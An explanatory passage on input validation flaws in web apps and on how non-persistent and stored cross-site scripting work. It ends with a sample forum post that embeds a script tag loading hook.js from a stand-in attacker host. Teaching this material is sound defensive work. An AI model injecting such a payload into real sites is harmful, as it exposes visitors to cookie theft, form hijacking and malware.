 The HTTP/HTTPS web protocol is based on servers responding to client requests. A developer can extend the basic protocol with software code and information stored in databases to implement a dynamic web app, rather than simply returning a static pages and graphics. A web application can use to methods of running code: 
* Server-side code is run on the HTTP/HTTPS web server to process the request and build the response before it is sent to the client.
* Client-side code runs within the web browser software on the client machine to modify the web page before it is displayed to the user or to modify requests made to the server.
Most applications depend on user input. One of the most widespread vulnerabilities in web apps is failure to validate this input properly. For example, the user might need to sign in using an email address and password, So the web app presents two text-box fields for the user to input those values.
if a threat actor can send a script via the username field and make the server or client execute that code, the web app has an input validation vulnerability 

A Cross-site scripting XSS attack exploits the fact that the browser is likely to trust scripts that appear to come from a site that user has chosen to visit. XSS inserts a malicious script that appears to be part of the trusted site. A non persistent type of XSS attack would proceed as follows: 

1. The attacker identifies an input validation vulnerability 
2. The attacker crafts a URL to perform code injection against the trusted site. This could be coded in a link to the attackers site from the trusted site or a link in a phishing email message.
3. When the user opens the link, the trusted site returns a page containing the malicious code injected by the attacker. As the browser is likely to be configured to allow the site to run scripts, the malicious code will execute.
4. The malicious code could be used to deface the trusted site (by adding any sort of arbitrary HTML code), steal data from the user's cookies, try to intercept information entered in a form, or try to install malware. The crucial point is that the malicious code runs in the clients browser with the same permission level as the trusted site.
This type of XSS attack is nonpersistent because at no point is data on the web server changed. A stored/persistent XSS attack aims to insert code into a back-end database or content management system used by the trusted site. The threat actor may submit a post to a bulletin board with a malicious script embedded in the message, for instance. When other users view the message, the malicious script executed. For example, with no input sanitization, a threat actor could type the following into net post text field. 

```
Check out this amazing <a href="https://trusted.foo">website</a><script src="https://badsite.foo/hook.js"></script>.
```

Users viewing the post will have the malicious script hook.js execute in their browser.
